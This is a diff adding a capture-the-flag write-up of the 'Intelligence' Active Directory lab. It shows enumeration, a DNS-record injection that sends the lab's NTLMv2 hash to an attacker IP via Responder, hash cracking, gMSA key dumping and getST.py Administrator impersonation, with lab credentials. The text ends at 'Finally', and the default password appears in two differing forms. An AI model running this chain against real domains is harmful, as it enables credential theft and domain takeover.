@@ -1,0 +1,226 @@
+<h1 id="intelligence-ad-silver-ticket">Intelligence (AD Silver ticket)</h1>
+
+<h1 id="skills">Skills</h1>
+
+<ul>
+  <li>Information leakage</li>
+  <li>Poweshell script analysis</li>
+  <li>DNS record injection</li>
+  <li>Read GMSA password</li>
+  <li>Silver Ticket Attack</li>
+</ul>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>The enumeration with Nmap showed a lot of ports tipically related with Active Directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.94 scan initiated Sun Oct 22 07:11:56 2023 as: nmap -p- -n -Pn -vvv -oG fast_v2 10.10.10.248</span>
+<span class="c"># Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)</span>
+Host: 10.10.10.248 <span class="o">()</span>	Status: Up
+Host: 10.10.10.248 <span class="o">()</span>	Ports: 53/open/tcp//domain///, 80/open/tcp//http///, 88/open/tcp//kerberos-sec///, 
+135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 
+445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 
+593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 
+3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 
+5985/open/tcp//wsman///, 9389/open/tcp//adws///, 
+49667/open/tcp/////, 49691/open/tcp/////, 49692/open/tcp/////, 
+49708/open/tcp/////, 49714/open/tcp/////	Ignored State: filtered <span class="o">(</span>65516<span class="o">)</span>
+<span class="c"># Nmap done at Sun Oct 22 07:13:56 2023 -- 1 IP address (1 host up) scanned in 119.76 seconds</span>
+</code></pre></div></div>
+
+<h2 id="dns">DNS</h2>
+
+<p>We will try to get as many domains from the DNS and also try a transfer zone attack, but nothing of this is possible.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>dig ANY intelligence.htb @10.10.10.248
+
+<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.18.16-1-Debian &lt;&lt;<span class="o">&gt;&gt;</span> ANY intelligence.htb @10.10.10.248
+<span class="p">;;</span> global options: +cmd
+<span class="p">;;</span> Got answer:
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 61212
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 4
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4000
+;; QUESTION SECTION:
+;intelligence.htb.              IN      ANY
+
+;; ANSWER SECTION:
+intelligence.htb.       600     IN      A       10.10.10.248
+intelligence.htb.       3600    IN      NS      dc.intelligence.htb.
+intelligence.htb.       3600    IN      SOA     dc.intelligence.htb. hostmaster.intelligence.htb. 76 900 600 86400 3600
+intelligence.htb.       600     IN      AAAA    dead:beef::1bb
+intelligence.htb.       600     IN      AAAA    dead:beef::9c0:29a8:e31:db1e
+
+;; ADDITIONAL SECTION:
+dc.intelligence.htb.    1200    IN      A       10.10.10.248
+dc.intelligence.htb.    1200    IN      AAAA    dead:beef::9c0:29a8:e31:db1e
+dc.intelligence.htb.    1200    IN      AAAA    dead:beef::1bb
+
+;; Query time: 56 msec
+;; SERVER: 10.10.10.248#53(10.10.10.248) (TCP)
+;; WHEN: Sun Oct 22 07:13:59 CEST 2023
+;; MSG SIZE  rcvd: 253
+
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─</span><span class="nv">$ </span><span class="sh">dig axfr intelligence.htb @10.10.10.248
+
+; &lt;&lt;&gt;&gt; DiG 9.18.16-1-Debian &lt;&lt;&gt;&gt; axfr intelligence.htb @10.10.10.248
+;; global options: +cmd
+; Transfer failed.
+</span></code></pre></div></div>
+
+<h2 id="rpc">RPC</h2>
+
+<ul>
+  <li>Need credentials</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/intelligence]
+└─<span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s1">'%'</span> 10.10.10.248
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+</code></pre></div></div>
+
+<h2 id="smb">SMB</h2>
+
+<ul>
+  <li>Need credentials</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/intelligence]
+└─<span class="nv">$ </span>smbclient <span class="nt">-L</span> <span class="se">\\\\</span>10.10.10.248<span class="se">\\</span>
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\k</span>ali]:
+Anonymous login successful
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
+do_connect: Connection to 10.10.10.248 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<h2 id="ldap">LDAP</h2>
+
+<ul>
+  <li>Need credentials</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/intelligence]
+└─<span class="nv">$ </span>windapsearch.py <span class="nt">-d</span> intelligence.htb <span class="nt">--dc-ip</span> 10.10.10.248 <span class="nt">-U</span>                                         
+<span class="o">[</span>+] No username provided. Will try anonymous bind.
+<span class="o">[</span>+] Using Domain Controller at: 10.10.10.248
+<span class="o">[</span>+] Getting defaultNamingContext from Root DSE
+<span class="o">[</span>+]     Found: <span class="nv">DC</span><span class="o">=</span>intelligence,DC<span class="o">=</span>htb
+<span class="o">[</span>+] Attempting <span class="nb">bind</span>
+<span class="o">[</span>+]     ...success! Binded as: 
+<span class="o">[</span>+]      None
+
+<span class="o">[</span>+] Enumerating all AD <span class="nb">users</span>
+<span class="o">[!]</span> Error retrieving <span class="nb">users</span>
+<span class="o">[!]</span> <span class="o">{</span><span class="s1">'msgtype'</span>: 101, <span class="s1">'msgid'</span>: 3, <span class="s1">'result'</span>: 1, <span class="s1">'desc'</span>: <span class="s1">'Operations error'</span>, <span class="s1">'ctrls'</span>: <span class="o">[]</span>, <span class="s1">'info'</span>: <span class="s1">'000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563'</span><span class="o">}</span>
+</code></pre></div></div>
+
+<h2 id="http">HTTP</h2>
+
+<p>In the web page we don’t find anything via fuzzing, subdomain enumeration, cookies nor input. However, there are two PDFs with a name where we can see the date in a specific format. Maybe, we can perform a bruteforce attack and retrieve more PDFs.</p>
+
+<p>That’s exactly what we can do to retrieve a default password valid for one of the users (intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser6987) that can be used to further enumerate the domain. In addition, we can see in another PDF that some service accounts may be explotable. We enumerate users checking the creator of the PDFs, one of these has the default password as her password.</p>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>We can enumerate SMB folders now and we see IT, which seems interesting since one of the PDF we found is called IT Update.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ADMIN<span class="nv">$ </span>                         Remote Admin
+C<span class="nv">$ </span>                             Default share
+IPC<span class="nv">$ </span>           READ            Remote IPC
+IT              READ            
+NETLOGON        READ            Logon server share 
+SYSVOL          READ            Logon server share 
+Users           READ
+</code></pre></div></div>
+
+<p>In IT share we found a powershell script that authenticates to multiple web servers.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check web server status. Scheduled to run every 5min</span><span class="w">
+</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">ActiveDirectory</span><span class="w"> 
+</span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$record</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"web*"</span><span class="p">)</span><span class="w">  </span><span class="p">{</span><span class="w">
+    </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+        
+        </span><span class="nv">$request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="s2">"http://</span><span class="si">$(</span><span class="nv">$record</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="nt">-UseDefaultCredentials</span><span class="w">
+        </span><span class="kr">if</span><span class="p">(</span><span class="o">.</span><span class="nf">StatusCode</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="n">Send-MailMessage</span><span class="w"> </span><span class="nt">-From</span><span class="w"> </span><span class="s1">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span><span class="w"> </span><span class="nt">-To</span><span class="w"> </span><span class="s1">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span><span class="w"> </span><span class="nt">-Subject</span><span class="w"> </span><span class="s2">"Host: </span><span class="si">$(</span><span class="nv">$record</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2"> is down"</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+
+    </span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{</span><span class="w">
+        
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Moreover we can see that the script runs every five minutes. I’m not very good at powershell but it is clear that it is iterating over all the DNS records, and making a HTTP request with authentication to those domains whose name start with <strong>web</strong>. So if we are able to inject a DNS record, the user making the request (Ted.Graves) will probably authenticate againts us. To inject a DNS record we can use <strong>**</strong><strong>dnstool</strong><strong>**</strong> from <a href="https://github.com/dirkjanm/krbrelayx/tree/master">https://github.com/dirkjanm/krbrelayx/https://github.com/dirkjanm/krbrelayx/tree/mastertree/master</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 dnstool.py <span class="nt">-u</span> <span class="s1">'intelligence.htb\Tiffany.Molina'</span> <span class="nt">-p</span> <span class="s1">'NewIntelligenceCorpUser9876'</span> <span class="nt">-a</span> add <span class="nt">-r</span> webcent <span class="nt">-t</span> A <span class="nt">-d</span> 10.10.14.2 10.10.10.248
+</code></pre></div></div>
+
+<p>We can check if the record has been injected using LDAP and making a query to the DC with <code class="language-plaintext highlighter-rouge">DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb</code> as base tree or simply using <strong>nslookup</strong>. We should see our injected record using any of these ways. Once the record has been successfully injected we need to set up responder to capture the credentials</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>responder <span class="nt">-I</span> tun0
+</code></pre></div></div>
+
+<p>Eventually, we will have the NTLMv2 hash of the user Ted.Graves. That can be cracked using hashcat or john. I like Hashcat.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>HTTP] NTLMv2 Client   : 10.10.10.248
+<span class="o">[</span>HTTP] NTLMv2 Username : intelligence<span class="se">\T</span>ed.Graves
+<span class="o">[</span>HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:795ed731100fa3bf:EC36E05D2F850C3191B90CE10EFBD308:0101000000000000C9381448F792D7018BC129454A682E4000000000020008004B0054005000330001001E00570049004E002D0046005500450036004F00300059003800440049003200040014004B005400500033002E004C004F00430041004C0003003400570049004E002D0046005500450036004F003000590038004400490032002E004B005400500033002E004C004F00430041004C00050014004B005400500033002E004C004F00430041004C000800300030000000000000000000000000200000579BF3BE75B46EDA9826B9B1C8B2518795D25E61038C5C91F8A10A3DFB9AC4B70A0010000000000000000000000000000000000009003C0048005400540050002F007700650062002D0030007800640066002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 5600 <span class="nb">hash</span> /usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<p>With all this we obtain the password for the user Ted.Graves → Mr.Teddy</p>
+
+<p>Next step is to perform and deeper enumeration to see what new actions we can perform with the user Ted.Graves. We will do this with bloodhound. To gather all the information we will user <code class="language-plaintext highlighter-rouge">bloodhound-python</code><strong>.</strong> The next images will show the path used to escalate privilage<strong>.</strong></p>
+
+<p><img src="/images/intelligence.png" alt="Untitled" /></p>
+
+<p><img src="/images/intelligence1.png" alt="Untitled" /></p>
+
+<p><img src="/images/intelligence2.png" alt="Untitled" /></p>
+
+<p>The information about the groups os Ted.Graves reveals that he is part of the IT SUPPORT group. The members of this group have the right to read the GMSA password of the user SVC_INT. This password is reset after some time and is usually used in service accounts. Finally, the user SVC_INT has the property the right AllowToDelegate over WWW/dc.intelligence.htb, so he can request a silver ticket for that SPN as any user, which allow us to spawn a shell as the administrator in the DC.</p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p>First of all we need to read the GMSA password of the user SVC_INT.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~/machines/windows/intelligence/gMSADumper</span><span class="p">]</span><span class="w">
+</span><span class="err">└─$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="n">gMSADumper.py</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s1">'Ted.Graves'</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s1">'Mr.Teddy'</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="n">intelligence.htb</span><span class="w">
+</span><span class="n">Users</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">groups</span><span class="w"> </span><span class="n">who</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">read</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">svc_int</span><span class="err">$</span><span class="p">:</span><span class="w">
+ </span><span class="err">&gt;</span><span class="w"> </span><span class="n">DC</span><span class="err">$</span><span class="w">
+ </span><span class="err">&gt;</span><span class="w"> </span><span class="n">itsupport</span><span class="w">
+</span><span class="n">svc_int</span><span class="err">$</span><span class="p">:::</span><span class="n">a9081669a8930109e4cd3421fd0ab06a</span><span class="w">
+</span><span class="n">svc_int</span><span class="err">$</span><span class="p">:</span><span class="n">aes256</span><span class="nt">-cts-hmac-sha1-96</span><span class="p">:</span><span class="mi">48</span><span class="n">d714a87b0ab840286bee26b5067f93a1487bea5ac91a679b6f190dfa2614f2</span><span class="w">
+</span><span class="n">svc_int</span><span class="err">$</span><span class="p">:</span><span class="n">aes128</span><span class="nt">-cts-hmac-sha1-96</span><span class="p">:</span><span class="mi">3</span><span class="n">af56845cf69669e62479ab36cde4b97</span><span class="w">
+</span></code></pre></div></div>
+
+<p>With these keys we can obtain a Silver Ticket for the user Administrator using the Allow to delegate privilage of the user SVC_INT.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~/.local/bin</span><span class="p">]</span><span class="w">
+</span><span class="err">└─$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">~/.local/bin/</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">sudo</span><span class="w"> </span><span class="nx">ntpdate</span><span class="w"> </span><span class="nx">10.10.10.248</span><span class="w">  </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">.</span><span class="nx">/getST.py</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nt">-no-pass</span><span class="w"> </span><span class="nt">-impersonate</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-spn</span><span class="w"> </span><span class="nx">WWW/dc.intelligence.htb</span><span class="w"> </span><span class="nx">intelligence.htb/svc_int</span><span class="err">$</span><span class="w"> </span><span class="nt">-aesKey</span><span class="w"> </span><span class="s1">'48d714a87b0ab840286bee26b5067f93a1487bea5ac91a679b6f190dfa2614f2'</span><span class="w">
+</span><span class="p">[</span><span class="n">sudo</span><span class="p">]</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">kali</span><span class="p">:</span><span class="w"> 
+</span><span class="mi">2023</span><span class="nt">-10-25</span><span class="w"> </span><span class="mi">01</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mf">09.802020</span><span class="w"> </span><span class="p">(</span><span class="o">+</span><span class="mi">0200</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="mf">25201.248314</span><span class="w"> </span><span class="o">+</span><span class="n">/-</span><span class="w"> </span><span class="nx">0.026798</span><span class="w"> </span><span class="nx">10.10.10.248</span><span class="w"> </span><span class="nx">s1</span><span class="w"> </span><span class="nx">no-leap</span><span class="w">
+</span><span class="n">CLOCK</span><span class="p">:</span><span class="w"> </span><span class="n">time</span><span class="w"> </span><span class="n">stepped</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="mf">25201.248314</span><span class="w">
+</span><span class="n">Impacket</span><span class="w"> </span><span class="n">v0.</span><span class="mf">10.0</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Copyright</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="n">SecureAuth</span><span class="w"> </span><span class="n">Corporation</span><span class="w">
+
+</span><span class="p">[</span><span class="o">-</span><span class="p">]</span><span class="w"> </span><span class="n">CCache</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">found.</span><span class="w"> </span><span class="n">Skipping.</span><span class="o">..</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Getting</span><span class="w"> </span><span class="n">TGT</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">user</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Impersonating</span><span class="w"> </span><span class="n">Administrator</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w">     </span><span class="n">Requesting</span><span class="w"> </span><span class="n">S4U2self</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w">     </span><span class="n">Requesting</span><span class="w"> </span><span class="n">S4U2Proxy</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Saving</span><span class="w"> </span><span class="n">ticket</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">Administrator.ccache</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Finally</p>
